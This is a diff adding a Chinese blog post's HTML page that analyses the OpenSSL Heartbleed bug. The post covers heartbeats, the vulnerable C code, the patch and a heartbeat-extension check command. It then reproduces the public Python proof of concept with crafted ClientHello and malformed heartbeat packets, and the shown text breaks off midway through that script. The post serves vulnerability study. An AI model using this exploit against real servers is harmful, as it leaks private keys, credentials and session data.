@@ -1,0 +1,1268 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="v_OkIhl-1XjKYm3MZSJoivLgfqE3N9Snb2bj2c9YDrw" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="web security,bin,heartbleed" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS e">
+<meta name="keywords" content="web security,bin,heartbleed">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OpenSSL Heartbleed  CVE-2014-0160">
+<meta property="og:url" content="http://yoursite.com/blog/Heartbleed/index.html">
+<meta property="og:site_name" content="empty_xl Blog">
+<meta property="og:description" content="The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS e">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/blog/Heartbleed/heartbleed.jpg">
+<meta property="og:image" content="http://yoursite.com/blog/Heartbleed/client-hello.png">
+<meta property="og:image" content="http://yoursite.com/blog/Heartbleed/heartbeat.png">
+<meta property="og:updated_time" content="2018-07-22T11:39:18.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="OpenSSL Heartbleed  CVE-2014-0160">
+<meta name="twitter:description" content="The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS e">
+<meta name="twitter:image" content="http://yoursite.com/blog/Heartbleed/heartbleed.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: 'QT63IJTEZX',
+      apiKey: '39726b4e0e80a502f3d0a45f494af02f',
+      indexName: 'emptyxl.github.io',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/blog/Heartbleed/"/>
+
+
+
+
+
+  <title>OpenSSL Heartbleed  CVE-2014-0160 | empty_xl Blog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-90390918-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?edc3c09a0382806fc3a47d6c11483da0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">empty_xl Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Hello World！</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/blog/Heartbleed/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="empty_xl">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="empty_xl Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">OpenSSL Heartbleed  CVE-2014-0160</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-15T15:54:24+08:00">
+                2018-07-15
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2018-07-22T19:39:18+08:00">
+                2018-07-22
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web-security/" itemprop="url" rel="index">
+                    <span itemprop="name">web security</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS encryption used to secure the Internet. SSL/TLS provides communication security and privacy over the Internet for applications such as web, email, instant messaging (IM) and some virtual private networks (VPNs).</p>
+<p>The Heartbleed bug allows anyone on the Internet to read the memory of the systems protected by the vulnerable versions of the OpenSSL software. This compromises the secret keys used to identify the service providers and to encrypt the traffic, the names and passwords of the users and the actual content. This allows attackers to eavesdrop on communications, steal data directly from the services and users and to impersonate services and users.</p>
+</blockquote>
+<p>关于Heartbleed 的常见问题和描述，可以看<a href="http://heartbleed.com" target="_blank" rel="external">The Heartbleed Bug</a> ps.专门为了这个漏洞建了一个网站可以想象这个漏洞在当年多么严重。</p>
+<p>接下来我们主要搞清楚这些具体都是什么含义<br><a id="more"></a></p>
+<h3 id="Heartbeat-amp-TCP-keepalive"><a href="#Heartbeat-amp-TCP-keepalive" class="headerlink" title="Heartbeat &amp; TCP keepalive"></a>Heartbeat &amp; TCP keepalive</h3><p>首先是<code>heartbeat</code>，它是计算机中周期性发送的某些操作或同步的信号，常常用于检测或判断资源是否可用。</p>
+<p>在默认情况下，在建立TCP连接之后，空闲时刻客户端和服务端不会互相发送数据包确认连接。假如有一端发生异常而掉线（如死机、防火墙拦截包、服务器爆炸），另一端若不进行连接确认，则会一直消耗资源。</p>
+<p>为了保证连接的有效性，可以检测到对方端非正常的断开，我们通常利用两种机制来实现：</p>
+<ul>
+<li>利用TCP协议的<code>Keepalive</code></li>
+<li>在应用层实现心跳检测<code>Heartbeat</code></li>
+</ul>
+<h4 id="TCP-keepalive"><a href="#TCP-keepalive" class="headerlink" title="TCP keepalive"></a>TCP keepalive</h4><p>通过定时发送Keepalive探测包来探测连接的对端是否存活.在收到对端的确认报文后，设置keepalive timer。</p>
+<p>当长时间两端无交互并且保活定时器超时的时候，本段会发送keepalive probe等待对端确认。若对端在一定时间内确认（具体的规则貌似比较繁琐），keepalive timer重置；否则，长时间未响应，连接终止。</p>
+<p>TCP Keepalive默认是关闭的，因为它会消耗额外的资源，并且可能会关闭正常的连接。Linux 默认<code>net.ipv4.tcp_keepalive_time</code>为7200s</p>
+<p>TCP keepalive 与 HTTP keep-alive</p>
+<ul>
+<li>前者探测连接是否存活</li>
+<li>后者是让连接活的久一点</li>
+</ul>
+<h4 id="Heartbeat"><a href="#Heartbeat" class="headerlink" title="Heartbeat"></a>Heartbeat</h4><ul>
+<li>应用层Heartbeat往往由自己编写</li>
+<li>灵活且可复用，应用层心跳包不依赖于传输层协议，无论传输层协议是TCP还是UDP都可以用</li>
+<li>应用层心跳包可以定制，可以应对更复杂的情况或传输一些额外信息</li>
+<li>TCP keepalive仅代表连接保持着，而心跳包往往还代表客户端可正常工作</li>
+</ul>
+<h3 id="OpenSSL"><a href="#OpenSSL" class="headerlink" title="OpenSSL"></a>OpenSSL</h3><p><code>OpenSSL</code>是一个开放源代码的软件库，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。这个库被广泛应用在互联网的网页服务器上。其主要库是以C语言所写成，实现了基本的加密功能，实现了SSL与TLS协议。关于SSL/TLS，可以参考我的这篇文章<a href="https://hellohxk.com/blog/ssl/" target="_blank" rel="external">TLS/SSL流程详解</a></p>
+<p>OpenSSL漏洞不仅影响以https开头的网站，攻击者还可利用此漏洞直接对个人电脑发起<code>Heartbleed</code>攻击</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">OpenSSL在Web容器如Apache<span class="regexp">/Nginx中使用，这两的全球份额超过66%。还在邮件服务如SMTP/</span><span class="keyword">POP</span><span class="regexp">/IMAP协议中使用，聊天服务如XMPP协议，VPN服务等多种网络服务中广泛使用。可以看到，当时有多严重</span></div></pre></td></tr></table></figure>
+<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><blockquote>
+<p>主要影响涉及开启了Heartbeat扩展的OpenSSL版本1.0.1f, 1.0.1e, 1.0.1d, 1.0.1c, 1.0.1b, 1.0.1a, 1.0.1</p>
+</blockquote>
+<p>可以通过以下代码判断网页是否开启了SSL Heartbeat扩展</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">openssl s_client -<span class="keyword">connect</span> $website:<span class="number">443</span> -tlsextdebug <span class="number">2</span>&gt;&amp;<span class="number">1</span>| <span class="keyword">grep</span> <span class="string">'TLS server extension "heartbeat"'</span></div></pre></td></tr></table></figure>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这次的漏洞属于SSL实现问题，协议本身没有问题。引用一张科普图来解释这个洞。</p>
+<img src="/blog/Heartbleed/heartbleed.jpg" alt="heartbleed" title="heartbleed">  
+<p>通俗的解释就是<code>OpenSSL</code>使用<code>heartbeat</code>探测对方主机是否在线，提供一个字符串和其长度，希望对方回应返回原样内容，但却未对长度与实际长度做验证，导致内存信息越界访问。由于可以不断尝试，返回的数据有可能是任何内容：用户请求密码，甚至是服务器私钥都有可能。</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hb</span></span> &#123;</div><div class="line">      <span class="keyword">int</span> <span class="class"><span class="keyword">type</span>;</span></div><div class="line">      <span class="keyword">int</span> length;</div><div class="line">      unsigned <span class="keyword">char</span> *data;                                                    </div><div class="line">&#125;;</div></pre></td></tr></table></figure>
+<p>在存在问题的版本，其逻辑是这样的，假设<code>hb</code>上面上发过来心跳包结构，<code>type</code>是类型，<code>length</code>是data长度，<code>*data</code>是实际的内容，所以类型是1字节，长度是2字节，剩下的length字节是数据，我们找出<a href="https://github.com/openssl/openssl/blob/46ebd9e3bb623d3c15ef2203038956f3f7213620/ssl/d1_both.c#L1446" target="_blank" rel="external">openssl-1.0.1e的源码</a></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span></span></div><div class="line"><span class="title">dtls1_process_heartbeat</span><span class="params">(SSL *s)</span></div><div class="line">	&#123;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *p = &amp;s-&gt;s3-&gt;rrec.data[<span class="number">0</span>], *pl;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> hbtype;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> payload;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> padding = <span class="number">16</span>; <span class="comment">/* Use minimum padding */</span></div><div class="line">	</div><div class="line"><span class="comment">// 定义变量并赋初值，p指向一条SSLv3的记录，结构如下:</span></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> ssl3_record_st</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">int</span> type;               <span class="comment">/* type of record */</span></div><div class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> length;    <span class="comment">/* How many bytes available */</span></div><div class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> off;       <span class="comment">/* read/write offset into 'buf' */</span></div><div class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> *data;    <span class="comment">/* pointer to the record data */</span></div><div class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> *input;   <span class="comment">/* where the decode bytes are */</span></div><div class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> *comp;    <span class="comment">/* only used with decompression - malloc()ed */</span></div><div class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> epoch;    <span class="comment">/* epoch number, needed by DTLS1 */</span></div><div class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> seq_num[<span class="number">8</span>]; <span class="comment">/* sequence number, needed by DTLS1 */</span></div><div class="line">    &#125; SSL3_RECORD;</div></pre></td></tr></table></figure>
+<p>定义完之后:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Read type and payload length first */</span></div><div class="line">hbtype = *p++;</div><div class="line">n2s(p, payload);</div><div class="line">pl = p;</div></pre></td></tr></table></figure>
+<p>我们可以看到，首先<code>hbtype</code>取了<code>p</code>的第一个字节，<code>n2s(p,payload)</code>函数是将<code>p</code>指向的2个字节赋值给<code>payload</code>，然后再<code>p+2</code>, <code>pl</code>指向剩余的部分。</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">if (s-&gt;msg_callback)... </div><div class="line"></div><div class="line">if (hbtype == TLS1_HB_REQUEST)</div><div class="line">&#123;</div><div class="line">	unsigned char *<span class="keyword">buffer, </span>*<span class="keyword">bp;</span></div><div class="line">	int r<span class="comment">;</span></div><div class="line"></div><div class="line">	<span class="comment">/* Allocate memory for the response, size is 1 byte</span></div><div class="line">	 * message type, plus 2 bytes payload length, plus</div><div class="line">	 * payload, plus padding</div><div class="line">	 */</div><div class="line">	<span class="keyword">buffer </span>= OPENSSL_malloc(<span class="number">1</span> + <span class="number">2</span> + payload + padding)<span class="comment">;</span></div><div class="line">	<span class="keyword">bp </span>= <span class="keyword">buffer;</span></div><div class="line"></div><div class="line">	<span class="comment">/* Enter response type, length and copy payload */</span></div><div class="line">	*<span class="keyword">bp++ </span>= TLS1_HB_RESPONSE<span class="comment">;</span></div><div class="line">	s2n(payload, <span class="keyword">bp);</span></div><div class="line">	memcpy(<span class="keyword">bp, </span>pl, payload)<span class="comment">;</span></div><div class="line">	<span class="keyword">bp </span>+= payload<span class="comment">;</span></div><div class="line">	<span class="comment">/* Random padding */</span></div><div class="line">	RAND_pseudo_bytes(<span class="keyword">bp, </span>padding)<span class="comment">;</span></div><div class="line">	</div><div class="line">	r = dtls1_write_bytes(s, TLS1_RT_HEARTBEAT, <span class="keyword">buffer, </span><span class="number">3</span> + payload + padding)<span class="comment">;</span></div><div class="line"></div><div class="line">		if (r &gt;= <span class="number">0</span> &amp;&amp; s-&gt;msg_callback)</div><div class="line">			s-&gt;msg_callback(<span class="number">1</span>, s-&gt;version, TLS1_RT_HEARTBEAT,</div><div class="line">				<span class="keyword">buffer, </span><span class="number">3</span> + payload + padding,</div><div class="line">				s, s-&gt;msg_callback_arg)<span class="comment">;</span></div><div class="line"></div><div class="line">		OPENSSL_free(<span class="keyword">buffer);</span></div><div class="line"></div><div class="line">		if (r &lt; <span class="number">0</span>)</div><div class="line">			return r<span class="comment">;</span></div><div class="line">	...</div><div class="line">&#125;</div><div class="line">else if (hbtype == TLS1_HB_RESPONSE) ...</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>代码非常清晰(我这种不会c的都看得懂):</p>
+<ol>
+<li>首先判断数据包类型，如果接收到的是心跳包，则处理</li>
+<li>为其分配了<code>1 + 2 + payload + padding</code>字节的缓冲区，用于返回内容，记做<code>buffer</code>，<code>bp</code>指向同一位置</li>
+<li>设置返回包数据类型<code>TLS1_HB_RESPONSE</code>，<code>s2n</code>同<code>n2s</code>用于赋值<code>payload</code>长度</li>
+<li>然后从<code>pl</code>出复制了<code>payload</code>长度的内容给<code>bp</code></li>
+<li>之后给<code>bp</code>随机填充</li>
+</ol>
+<p>我们可以看到，<strong>由于<code>payload</code>的是用户传递过来了，其并不一定等于实际消息内容</strong>，当<code>payload</code>值大于<code>pl</code>中实际剩余内容的长度时，就造成了漏洞，由于我们不知道<code>pl</code>后面内存中的内容，由于当时全网ssl还没有普及，一些关键部分使用ssl反而更加严重。(例如，账号密码，HTTP报头cookie)</p>
+<p>我们可以分析，由于<code>payload</code>为2字节<code>unsigned int</code>，最大值为<code>65525</code>，即最多泄露<code>64KB</code>内容</p>
+<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Read type and payload length first */</span></div><div class="line">if (<span class="number">1</span> + <span class="number">2</span> + <span class="number">16</span> &gt; s-&gt;s3-&gt;rrec.length)</div><div class="line">	return <span class="number">0</span>; <span class="comment">/* silently discard */</span></div><div class="line">hbtype = *p++;</div><div class="line">n2s(p, payload);</div><div class="line">if (<span class="number">1</span> + <span class="number">2</span> + payload + <span class="number">16</span> &gt; s-&gt;s3-&gt;rrec.length)</div><div class="line">	return <span class="number">0</span>; <span class="comment">/* silently discard per RFC 6520 sec. 4 */</span></div><div class="line">pl = p;</div></pre></td></tr></table></figure>
+<p>我们可以看到，相比于之前直接取2个字节给<code>payload</code>，其验证了长度和考虑的长度为0的情况，其余与原来的代码一致。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>官方的POC如下，我们做一下分析:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"></div><div class="line"><span class="comment"># Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)</span></div><div class="line"><span class="comment"># The author disclaims copyright to this source code.</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"><span class="keyword">import</span> socket</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> select</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</div><div class="line"></div><div class="line">options = OptionParser(usage=<span class="string">'%prog server [options]'</span>, description=<span class="string">'Test for SSL heartbeat vulnerability (CVE-2014-0160)'</span>)</div><div class="line">options.add_option(<span class="string">'-p'</span>, <span class="string">'--port'</span>, type=<span class="string">'int'</span>, default=<span class="number">443</span>, help=<span class="string">'TCP port to test (default: 443)'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">h2bin</span><span class="params">(x)</span>:</span></div><div class="line">    <span class="keyword">return</span> x.replace(<span class="string">' '</span>, <span class="string">''</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>).decode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line">hello = h2bin(<span class="string">'''</span></div><div class="line">16 03 02 00  dc 01 00 00 d8 03 02 53</div><div class="line">43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf</div><div class="line">bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00</div><div class="line">00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88</div><div class="line">00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c</div><div class="line">c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09</div><div class="line">c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44</div><div class="line">c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c</div><div class="line">c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11</div><div class="line">00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04</div><div class="line">03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19</div><div class="line">00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08</div><div class="line">00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13</div><div class="line">00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00</div><div class="line">00 0f 00 01 01                                  </div><div class="line">''')</div><div class="line"></div><div class="line">hb = h2bin(<span class="string">''' </span></div><div class="line">18 03 02 00 03</div><div class="line">01 40 00</div><div class="line">''')</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexdump</span><span class="params">(s)</span>:</span></div><div class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> xrange(<span class="number">0</span>, len(s), <span class="number">16</span>):</div><div class="line">        lin = [c <span class="keyword">for</span> c <span class="keyword">in</span> s[b : b + <span class="number">16</span>]]</div><div class="line">        hxdat = <span class="string">' '</span>.join(<span class="string">'%02X'</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> lin)</div><div class="line">        pdat = <span class="string">''</span>.join((c <span class="keyword">if</span> <span class="number">32</span> &lt;= ord(c) &lt;= <span class="number">126</span> <span class="keyword">else</span> <span class="string">'.'</span> )<span class="keyword">for</span> c <span class="keyword">in</span> lin)</div><div class="line">        <span class="keyword">print</span> <span class="string">'  %04x: %-48s %s'</span> % (b, hxdat, pdat)</div><div class="line">    <span class="keyword">print</span></div><div 